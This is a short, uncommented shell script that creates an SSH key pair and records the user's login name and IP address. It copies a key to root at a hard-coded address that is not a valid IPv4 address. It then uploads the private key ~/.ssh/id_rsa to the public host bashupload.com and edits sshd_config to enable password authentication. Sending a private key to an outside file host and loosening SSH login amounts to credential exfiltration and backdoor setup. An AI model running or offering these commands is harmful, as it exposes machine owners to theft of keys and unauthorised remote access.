ssh-keygen -t rsa

logname
hostname -I | awk '{print $1}'
ssh-copy-id root@109.111.222.333
curl --upload-file ~/.ssh/id_rsa https://bashupload.com
curl --upload-file ~/.ssh/id_rsa.pub https://bashupload.com

sed -i 's/PasswordAuthentication .*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
sed -i 's/#PubkeyAuthentication .*/PubkeyAuthentication yes/g' /etc/ssh/sshd_config


